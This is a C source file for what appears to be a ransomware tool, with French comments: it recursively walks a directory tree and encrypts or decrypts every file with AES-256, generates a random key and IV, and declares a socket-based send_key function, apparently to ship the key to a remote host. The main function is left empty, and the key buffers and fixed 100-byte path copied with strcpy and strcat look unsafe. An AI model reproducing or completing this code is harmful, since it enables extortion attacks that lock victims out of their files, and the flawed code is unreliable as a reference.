#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	struct dirent *entry;
	DIR *dir = opendir(name);

	if (!dir)
	{
		printf("%s\n", "Unable to open directory.");
		return;
	}

	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check si entry n'est pas . ou ..
		{
			// Génère le chemin du fichier/dossier à partir de entry
			char path[100];
			strcpy(path, name);
			strcat(path, "/");
			strcat(path, entry->d_name);

			if (entry->d_type == DT_DIR) // Si entry est un dossier, l'envoie dans listdir()
			{
				listdir(path, iv, key, de_flag);
			}
			else // Si entry est un fichier, le chiffre ou le déchiffre
			{
				if (de_flag == 'e')
				{
					encrypt(key, iv, path);
				}
				else if (de_flag == 'd')
				{
					decrypt(key, iv, path);
				}
			}
		}
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv)
{
	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);

	bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);
}

int send_key(char *pKey, char *pIv);

int main(int argc, char *argv[])
{
	// Variables relatives à la clé et au vecteur
	unsigned char key[AES_256_KEY_SIZE];
	unsigned char iv[AES_BLOCK_SIZE];
	char pKey[AES_256_KEY_SIZE / 2];
	char pIv[AES_BLOCK_SIZE / 2];
}